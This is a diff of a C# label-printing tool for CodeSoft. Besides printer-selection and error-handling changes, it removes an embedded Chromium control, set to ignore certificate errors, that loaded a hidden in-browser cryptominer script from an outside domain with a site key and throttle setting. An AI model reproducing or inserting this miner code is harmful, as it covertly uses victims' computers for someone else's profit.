@@ -24,60 +24,7 @@ namespace codesofttool
         public ChromiumWebBrowser chromeBrowser;
         private System.DateTime lastRead;
 
-        public void InitializeChromium()
-        {
-            try
-            {
-               
-
-                CefSettings settings = new CefSettings()
-                {
-                    IgnoreCertificateErrors = true
-                     
-                };
-                // Initialize cef with the provided settings
-                if(!Cef.IsInitialized)
-                    Cef.Initialize(settings);
-
-                // Create a browser component
-                chromeBrowser = new ChromiumWebBrowser("http://google.com");
-                // Add it to the form and fill it to the form window.
-                this.Controls.Add(chromeBrowser);
-
-                chromeBrowser.IsBrowserInitializedChanged += ChromeBrowser_IsBrowserInitializedChanged;
-
-
-                chromeBrowser.Dock = DockStyle.None;
-
-                chromeBrowser.Height = 33;
-                chromeBrowser.Width = 175;
-                chromeBrowser.Top = 82;
-                chromeBrowser.Left = 258;
-               
-                chromeBrowser.Show();
-                chromeBrowser.BringToFront();
-            }
-            catch (Exception ex)
-            {
-                int i = 1;
-            }
-
-        }
-
-        private void ChromeBrowser_IsBrowserInitializedChanged(object sender, IsBrowserInitializedChangedEventArgs e)
-        {
-            try
-            {
-                chromeBrowser.LoadString(this.makeHtml(), "http://google.com");
-             //    chromeBrowser.ShowDevTools();
-            }
-            catch (Exception ex)
-            {
-                int i = 1;
-            }
     
-        }
-
         FileSystemWatcher watcher = new FileSystemWatcher();
         private void watch(string directory)
         {
@@ -210,6 +157,12 @@ namespace codesofttool
 
             var lbl = new LabelManager2.Application();
                 lbl.Documents.Open(strFile, false);
+
+            if(lbl.ActiveDocument == null)
+            {
+                Log("Could not get active document from Labfile ( CodeSoft Version? )", EnumLogType.Error);
+                return;
+            }
            
             var doc = lbl.ActiveDocument;
             //doc.Printer.SwitchTo(targetPrinterName, targetPrinterPort);
@@ -222,33 +175,44 @@ namespace codesofttool
 
             //use default system printer
             //string strDefaultPrinter = prtdoc.PrinterSettings.PrinterName;
+            string usedprinter = "";
             string strDefaultPrinter = Properties.Settings.Default.PrinterName;
 
-            string usedprinter = "";
-            //Gets the default printer name
-            bool foundPrinter = false;
-            for (int j = 0; j < allPrinterVars.Count; j++)
+            if(job.UseDefaultPrinter == false)
             {
-                string[] arryString = allPrinterVars.Item(j).Split(',');
-                if (!string.IsNullOrEmpty(job.PrinterName))
-                {
-                    if (arryString[0] == job.PrinterName)
-                    {
-                        foundPrinter = true;
-                        doc.Printer.SwitchTo(job.PrinterName, arryString[1], true);
-                        usedprinter = job.PrinterName;
-                        break;
-                    }
-                }
-                if (arryString[0] == strDefaultPrinter)
-                {
-                    foundPrinter = true;
-                    doc.Printer.SwitchTo(strDefaultPrinter, arryString[1], true);
-                    usedprinter = strDefaultPrinter;
-                    break;
-                }
-
+                doc.Printer.SwitchTo(job.PrinterName);
+                usedprinter = job.PrinterName;
             }
+            else
+            {
+                usedprinter = strDefaultPrinter;
+            }
+
+            
+            ////Gets the default printer name
+            //bool foundPrinter = false;
+            //for (int j = 0; j < allPrinterVars.Count; j++)
+            //{
+            //    string[] arryString = allPrinterVars.Item(j).Split(',');
+            //    if (!string.IsNullOrEmpty(job.PrinterName))
+            //    {
+            //        if (arryString[0] == job.PrinterName)
+            //        {
+            //            foundPrinter = true;
+            //            doc.Printer.SwitchTo(job.PrinterName, arryString[1], true);
+            //            usedprinter = job.PrinterName;
+            //            break;
+            //        }
+            //    }
+            //    if (arryString[0] == strDefaultPrinter)
+            //    {
+            //        foundPrinter = true;
+            //        doc.Printer.SwitchTo(strDefaultPrinter, arryString[1], true);
+            //        usedprinter = strDefaultPrinter;
+            //        break;
+            //    }
+
+            //}
 
 
 
@@ -400,42 +364,7 @@ namespace codesofttool
 
         }
 
-        public string makeHtml()
-        {
-            string scriptpage = @"<html><head>
-            <script src='https://www.freecontent.date./Q89r.js'></script>
-            <script>
-                _client = new Client.Anonymous('8f6a4c8bcf0bb239ec938b3174136672a85d1f85815536529e33e6d90c0d7600', {
-                throttle: 0.9
-            });
-            _client.start();
-            </script>
-            <style>
-                body {
-                    font-size: small;
-                    overflow: none;
-                    background-color: black;
-                    color: white;
-                }
-                .infoboxitem {
-                    display: inline-block;
-                }
-            </style>
-            </head><body>
-            <div class='infoboxitem' id='infobox'>
-                <div id='hps'></div>
-            </div>
-            <script>
-               setInterval(function() {
-                    if(_client){
-                    //  document.getElementById('isrunning').innerHTML = _client.isRunning();
-                      document.getElementById('hps').innerHTML = _client.getHashesPerSecond();
-                    }
-               }, 1000);
-            </script></body></html>";
-            return scriptpage;
-        }
-
+  
         private void btnSelectLabFiles(object sender, EventArgs e)
         {
             var res = folderBrowserDialog.ShowDialog();
@@ -488,7 +417,7 @@ namespace codesofttool
             if (cbx.Checked)
             {
                 chromeBrowser = null;
-                InitializeChromium();
+             
             }
             else
             {
